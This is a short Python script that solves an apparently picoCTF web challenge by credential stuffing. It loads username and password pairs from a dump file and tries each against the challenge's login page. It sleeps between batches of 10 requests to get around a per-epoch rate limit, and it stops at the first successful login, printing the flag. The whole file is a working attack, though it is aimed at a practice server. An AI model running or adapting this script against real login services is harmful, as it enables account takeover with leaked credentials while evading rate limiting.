import requests, re, time

TARGET="http://candy-mountain.picoctf.net:51822/"
MAX_REQUESTS = 10
EPOCH_DURATION = 30
creds =[]


with open("../creds-dump(2).txt", "r") as f:
    for line in f:
        username, password = line.strip().split(";", 1)
        creds.append((username,password))

batch = 0
for user, pwd in creds:
    if batch >= MAX_REQUESTS:
        print(f"[*] Pause de {EPOCH_DURATION + 1}s pour reset de l'epoch...")
        time.sleep(EPOCH_DURATION + 1)
        batch=0

    with requests.Session() as s:
        r = s.post(f"{TARGET}/login", data={'username': user, 'password': pwd}, allow_redirects=False)
        batch+=1
        
        if r.status_code == 302 :
            home = s.get(TARGET)
            flag = re.search(r"picoCTF\{[^}]+\}", home.text)
            print(f"[SUCCESS] {user}:{pwd}")
            if flag:
                print(f"[FLAG] {flag.group(0)}")
            break
        else:
            print(f"[TRY] {user}:{pwd} -> échec")
